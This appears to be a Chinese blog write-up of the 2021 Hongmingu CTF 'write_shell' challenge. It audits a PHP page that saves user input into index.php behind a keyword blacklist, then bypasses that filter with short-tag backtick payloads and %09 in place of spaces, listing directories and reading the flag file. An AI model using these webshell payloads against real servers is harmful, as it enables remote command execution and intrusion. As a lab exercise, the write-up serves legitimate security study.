---
title: 红明谷CTF 2021 write_shell
date: 2024-05-30 17:20:20
tags: 题解
categories: 刷题笔记
---

### [红明谷CTF 2021]write_shell（短标签&代码审计）

打开页面，开始代码审计

<!-- more -->

```
<?php
error_reporting(0);
highlight_file(__FILE__);
function check($input){
    if(preg_match("/'| |_|php|;|~|\\^|\\+|eval|{|}/i",$input)){
        // if(preg_match("/'| |_|=|php/",$input)){
        die('hacker!!!');
    }else{
        return $input;
    }
}

function waf($input){
  if(is_array($input)){
      foreach($input as $key=>$output){
          $input[$key] = waf($output);
      }
  }else{
      $input = check($input);
  }
}

$dir = 'sandbox/' . md5($_SERVER['REMOTE_ADDR']) . '/';
if(!file_exists($dir)){
    mkdir($dir);
}
switch($_GET["action"] ?? "") {
    case 'pwd':
        echo $dir;
        break;
    case 'upload':
        $data = $_GET["data"] ?? "";
        waf($data);
        file_put_contents("$dir" . "index.php", $data);
}
?>
```

check方法，过滤了空格，_,php一些东西

```
function check($input){
    if(preg_match("/'| |_|php|;|~|\\^|\\+|eval|{|}/i",$input)){
        // if(preg_match("/'| |_|=|php/",$input)){
        die('hacker!!!');
    }else{
        return $input;
    }
}
```

waf用来检查input里是否存在非法字符

```
function waf($input){
  if(is_array($input)){
      foreach($input as $key=>$output){
          $input[$key] = waf($output);
      }
  }else{
      $input = check($input);
  }
}
```

下面的代码是用来这里使用了访问者的IP地址（通过`$_SERVER['REMOTE_ADDR']` 获取）并对其进行MD5哈希，生成一个唯一的字符串。这个字符串被用来创建一个目录路径，位于 `sandbox/` 目录下。再使用 `file_exists` 函数检查该目录是否已经存在。如果目录不存在，使用 `mkdir` 函数创建这个目录。

```
$dir = 'sandbox/' . md5($_SERVER['REMOTE_ADDR']) . '/';
if(!file_exists($dir)){
    mkdir($dir);
}
```

提供可控参数，并进行文件上传

```
switch($_GET["action"] ?? "") {
    case 'pwd':
        echo $dir;
        break;
    case 'upload':
        $data = $_GET["data"] ?? "";
        waf($data);
        file_put_contents("$dir" . "index.php", $data);
}
```

我们先给action传参pwd，查看上传目录

![image-20240602214614014](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406022146067.png)

得到上传目录了，我们进行文件上传，由于eval和_被过滤了，我们不考虑一句话木马，同时php被过滤了，我们使用短标签和反引号用来命令执行，空格也被过滤了，我们使用%09代替

```
?action=upload&data=<?=`ls%09/`?>
```

没出现hacker！！！,说明上传成功了，我们查看目录

![image-20240602214915657](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406022149724.png)

发现了根目录下的文件，我们打开flag文件

```
?action=upload&data=<?=`cat%09/flllllll1112222222lag`?>
```

找到flag

![image-20240602215036764](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406022150789.png)
